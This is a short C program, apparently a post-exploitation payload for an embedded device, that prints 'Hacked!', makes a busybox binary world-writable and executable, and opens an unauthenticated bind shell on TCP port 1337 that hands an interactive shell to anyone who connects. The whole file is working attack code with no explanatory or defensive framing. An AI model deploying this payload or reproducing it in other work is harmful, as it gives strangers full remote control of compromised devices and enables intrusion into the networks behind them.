
#include <stdio.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>

extern char** environ;

void main() {
    puts("Hacked!");

    chmod("/flash/rw/disk/busybox", 0777);

    int sockfd;
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror("socket");
        exit(-1);
    }

    int opt = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) {
        perror("setsockopt");
        exit(-1);
    }

    struct sockaddr_in address;
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(1337);

    if (bind(sockfd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("bind");
        exit(-1);
    }

    if (listen(sockfd, 10) < 0) {
        perror("listen");
        exit(-1);
    }

    while (1) {
        int addr_size = sizeof(address);
        int conn = accept(sockfd, (struct sockaddr *)&address, &addr_size);
        if (conn < 0) {
            perror("accept");
            exit(-1);
        }

        pid_t child = fork();
        if (child == 0) {
            puts("New connection!");

            dup2(conn, 0);
            dup2(conn, 1);
            dup2(conn, 2);

            const char * argv[] = {
                "/flash/rw/disk/busybox",
                "sh",
                "-i",
                NULL
            };

            int res = execve("/flash/rw/disk/busybox", argv, environ);
            if (!res) {
                perror("execve");
                exit(-1);
            }

            exit(0);
        }
    }
}
